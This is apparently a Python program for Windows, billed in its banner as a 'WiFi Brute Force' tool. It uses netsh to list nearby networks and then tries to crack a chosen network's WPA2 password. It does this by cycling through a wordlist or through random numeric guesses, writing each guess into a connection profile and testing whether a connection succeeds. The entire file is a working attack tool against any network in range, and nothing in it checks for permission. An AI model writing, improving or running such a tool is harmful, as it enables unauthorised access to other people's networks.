import subprocess
import os
import time
import random
import threading
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

def print_banner():
    banner = r"""
 __          __  _  _    _____ _  __ _
 \ \        / / | || |  / ____| |/ /| |
  \ \  /\  / /__| || |_| (___ | ' / | |
   \ \/  \/ / _ \__   _\___ \|  <  | |
    \  /\  /  __/  | |  ____) | . \ | |____
     \/  \/ \___|  |_| |_____/|_|\_\|______|

            WiFi Brute Force & Scurerity Tool

             By M4rkR0ck
"""
    print(Fore.CYAN + banner)

def get_wifi_interfaces():
    result = subprocess.run(
        ["netsh", "wlan", "show", "interfaces"],
        capture_output=True,
        text=True
    )
    interfaces = []
    for line in result.stdout.splitlines():
        if "Name" in line:
            name = line.split(":", 1)[1].strip()
            if name:
                interfaces.append(name)
    return interfaces

def scan_wifi(interface):
    result = subprocess.run(
        ["netsh", "wlan", "show", "networks", "mode=bssid", f"interface={interface}"],
        capture_output=True,
        text=True
    )
    networks = []
    current = {}
    for line in result.stdout.splitlines():
        line = line.strip()
        if line.startswith("SSID ") and "BSSID" not in line:
            if current:
                networks.append(current)
            current = {"SSID": line.split(":",1)[1].strip()}
        elif line.startswith("BSSID"):
            current["BSSID"] = line.split(":",1)[1].strip()
        elif "Signal" in line:
            current["Signal"] = line.split(":",1)[1].strip()
        elif "Channel" in line:
            current["Channel"] = line.split(":",1)[1].strip()
        elif "Authentication" in line:
            current["Auth"] = line.split(":",1)[1].strip()
    if current:
        networks.append(current)
    return networks

def connect_to_wifi(interface, network_name, password):
    xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{network_name}</name>
    <SSIDConfig>
        <SSID>
            <name>{network_name}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    with open('wifi.xml', 'w') as f:
        f.write(xml)

    try:
        subprocess.run(["netsh", "wlan", "add", "profile", f"filename=wifi.xml", f"interface={interface}"], check=True)
        subprocess.run(["netsh", "wlan", "connect", f"name={network_name}", f"ssid={network_name}", f"interface={interface}"], check=True)
        time.sleep(2)  # ลดเวลา wait

        ipconfig = subprocess.run(["ipconfig"], capture_output=True, text=True).stdout
        has_ip = any(
            line.strip().startswith(("IPv4 Address", "IPv4 Address.")) and
            line.split(":")[-1].strip().startswith(("192.", "10.", "172."))
            for line in ipconfig.splitlines()
        )

        if not has_ip:
            return False

        ping_result = subprocess.run(["ping", "8.8.8.8", "-n", "1"], capture_output=True, text=True)
        return "TTL=" in ping_result.stdout

    except subprocess.CalledProcessError:
        return False
    finally:
        if os.path.exists('wifi.xml'):
            os.remove('wifi.xml')

# Global variable for scan results
all_networks = []

def scan_loop_thread(interface, interval=1):
    global all_networks
    seen_networks = {}
    try:
        while True:
            networks = scan_wifi(interface)
            updated = False
            for net in networks:
                ssid = net["SSID"]
                sig = net.get("Signal","")
                if ssid not in seen_networks or seen_networks[ssid] != sig:
                    seen_networks[ssid] = sig
                    updated = True
            if updated:
                all_networks = networks
                print(Fore.YELLOW + "\nAvailable Wi-Fi Networks (Updated):")
                for i, net in enumerate(networks, 1):
                    auth = net.get("Auth","")
                    danger = ""
                    if "Open" in auth:
                        danger = Fore.RED + " [risky]"
                    print(Fore.GREEN + f"{i}. {net['SSID']} | Signal: {net.get('Signal','')} | Channel: {net.get('Channel','')} | Auth: {auth} | MAC: {net.get('BSSID','')}" + danger)
            time.sleep(interval)
    except KeyboardInterrupt:
        return

def brute_force_numeric(interface, wifi_name, length):
    attempts = 0
    start_time = time.time()
    while True:
        guess = "".join(random.choices("0123456789", k=length))
        print(Fore.CYAN + f"Trying password: {guess}")
        if connect_to_wifi(interface, wifi_name, guess):
            print(Fore.GREEN + f"\n✅ Password found: {guess}")
            break
        attempts += 1
    end_time = time.time()
    print(Fore.MAGENTA + f"Total attempts: {attempts}")
    print(Fore.MAGENTA + f"Time elapsed: {end_time - start_time:.2f} seconds")

def wordlist_attack(interface, wifi_name, wordlist_path):
    if not os.path.exists(wordlist_path):
        print(Fore.RED + "❌ Wordlist file not found.")
        return
    attempts = 0
    start_time = time.time()
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            password = line.strip()
            if not password:
                continue
            print(Fore.CYAN + f"Trying password: {password}")
            if connect_to_wifi(interface, wifi_name, password):
                print(Fore.GREEN + f"\n✅ Password found: {password}")
                break
            attempts += 1
    end_time = time.time()
    print(Fore.MAGENTA + f"Total attempts: {attempts}")
    print(Fore.MAGENTA + f"Time elapsed: {end_time - start_time:.2f} seconds")

def main():
    print_banner()
    while True:
        interfaces = get_wifi_interfaces()
        if not interfaces:
            print(Fore.RED + "❌ No Wi-Fi interfaces found!")
            return
        print(Fore.YELLOW + "\nAvailable Wi-Fi Interfaces:")
        for i, iface in enumerate(interfaces, 1):
            print(Fore.GREEN + f"{i}. {iface}")
        idx = input("Select interface number (or 'q' to quit): ").strip()
        if idx.lower() == 'q':
            break
        if not idx.isdigit() or int(idx) < 1 or int(idx) > len(interfaces):
            print(Fore.RED + "❌ Invalid selection.")
            continue
        interface = interfaces[int(idx)-1]

        # Start scanning in background
        t = threading.Thread(target=scan_loop_thread, args=(interface,), daemon=True)
        t.start()
        time.sleep(1)  # ให้ thread start

        while True:
            if not all_networks:
                time.sleep(1)
                continue
            sel = input("Select Wi-Fi number (or 'b' to go back): ").strip()
            if sel.lower() == 'b':
                break
            if not sel.isdigit() or int(sel) < 1 or int(sel) > len(all_networks):
                print(Fore.RED + "❌ Invalid selection.")
                continue
            wifi_name = all_networks[int(sel)-1]["SSID"]

            mode = input("Select mode (1 = wordlist, 2 = brute-force numeric, b = back): ").strip()
            if mode.lower() == 'b':
                continue
            elif mode == "1":
                wordlist_path = input("Enter full path to wordlist file: ").strip()
                wordlist_attack(interface, wifi_name, wordlist_path)
            elif mode == "2":
                length = input("Enter numeric password length: ").strip()
                if not length.isdigit():
                    print(Fore.RED + "❌ Invalid length")
                    continue
                brute_force_numeric(interface, wifi_name, int(length))
            else:
                print(Fore.RED + "❌ Invalid mode selected.")

if __name__ == "__main__":
    main()
